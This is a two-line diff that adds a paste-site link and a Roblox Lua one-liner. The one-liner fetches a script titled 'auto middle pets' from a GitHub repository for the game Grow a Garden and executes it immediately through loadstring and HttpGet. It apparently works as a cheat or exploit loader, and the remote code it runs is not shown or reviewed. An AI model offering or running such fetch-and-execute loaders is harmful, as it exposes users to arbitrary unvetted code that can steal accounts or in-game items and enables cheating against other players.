@@ -1,0 +1,2 @@
+https://cdn.sourceb.in/bins/M1vKnUgNa4/0
+loadstring(game:HttpGet("https://raw.githubusercontent.com/taparjohn011-boop/grow-a-garden/refs/heads/main/auto%20middle%20pets"))()
